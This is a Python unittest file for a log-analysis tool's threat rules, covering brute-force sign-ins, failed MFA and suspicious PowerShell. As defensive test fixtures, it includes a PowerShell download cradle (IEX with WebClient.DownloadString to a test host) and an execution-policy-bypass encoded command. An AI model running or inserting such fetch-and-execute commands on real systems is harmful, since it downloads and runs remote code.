"""Tests for evidence threat rules."""

import unittest

from evidence_parser import EvidenceDocument
from threat_rules import analyze_document


class ThreatRulesTests(unittest.TestCase):
    def test_failed_login_detection(self):
        document = EvidenceDocument(
            file_name="signin.csv",
            extension=".csv",
            parsed_type="csv",
            records=[{"user": "alex@example.test", "failed_login_count": "6", "mfa_result": "failed"}],
            lines=[],
        )
        titles = [finding.title for finding in analyze_document(document)]
        self.assertIn("Multiple failed logins", titles)
        self.assertIn("Failed MFA", titles)

    def test_suspicious_powershell_detection(self):
        document = EvidenceDocument(
            file_name="events.log",
            extension=".log",
            parsed_type="text",
            records=[],
            lines=["powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA"],
        )
        titles = [finding.title for finding in analyze_document(document)]
        self.assertIn("Suspicious PowerShell keywords", titles)
        self.assertIn("Encoded PowerShell command", titles)

    def test_download_cradle_detection(self):
        document = EvidenceDocument(
            file_name="events.log",
            extension=".log",
            parsed_type="text",
            records=[],
            lines=["IEX (New-Object Net.WebClient).DownloadString('https://login.example.test/a.ps1')"],
        )
        titles = [finding.title for finding in analyze_document(document)]
        self.assertIn("Download cradle indicator", titles)
        self.assertIn("Suspicious URL indicator", titles)

    def test_failed_login_detection_across_rows(self):
        rows = [
            {"user": "alex@example.test", "source_ip": "203.0.113.10", "signin_status": "failed"}
            for _ in range(5)
        ]
        document = EvidenceDocument("signin.csv", ".csv", "csv", records=rows, lines=[])

        titles = [finding.title for finding in analyze_document(document)]

        self.assertIn("Multiple failed logins", titles)

    def test_success_after_failures_inferred_across_rows(self):
        rows = [
            {"user": "alex@example.test", "source_ip": "203.0.113.10", "signin_status": "failed"},
            {"user": "alex@example.test", "source_ip": "203.0.113.10", "signin_status": "failed"},
            {"user": "alex@example.test", "source_ip": "203.0.113.10", "signin_status": "success"},
        ]
        document = EvidenceDocument("signin.csv", ".csv", "csv", records=rows, lines=[])

        titles = [finding.title for finding in analyze_document(document)]

        self.assertIn("Successful login after failures", titles)


if __name__ == "__main__":
    unittest.main()
